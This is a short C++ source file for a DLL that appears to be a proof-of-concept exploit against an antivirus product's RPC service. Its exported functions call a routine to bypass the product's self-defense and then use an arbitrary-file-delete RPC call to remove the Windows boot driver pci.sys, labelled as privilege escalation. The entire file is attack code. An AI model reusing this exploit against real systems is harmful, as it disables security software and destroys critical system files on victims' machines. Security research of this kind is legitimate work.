// AavmArbitraryFileDeleteExploit.cpp : Defines the exported functions for the DLL.
//

#include <Windows.h>
#include "AavmArbitraryFileDeleteExploit.h"
#include "AavmRpcClient.h"
#include <stdexcept>
#include <filesystem>

namespace fs = std::filesystem;

EntryPointType g_originalEntryPoint;

void CALLBACK Exploit(HWND, HINSTANCE, PCSTR, INT)
{
    try
    {
        BypassSelfDefense();
    }
    catch (const std::exception &e)
    {
        // ToDo: Log error
        UNREFERENCED_PARAMETER(e);
        __debugbreak();
    }
}

int APIENTRY EscalatePrivileges()
{
    try
    {
        AavmRpcClient aavmRpcClient;
        const fs::path targetFilePath = LR"(C:\Windows\System32\drivers\pci.sys)";

        aavmRpcClient.ArbitraryFileDelete(targetFilePath.c_str());
    }
    catch (const std::exception &e)
    {
        // ToDo: Log error
        UNREFERENCED_PARAMETER(e);
        __debugbreak();
    }

    return /*g_originalEntryPoint()*/0;
}
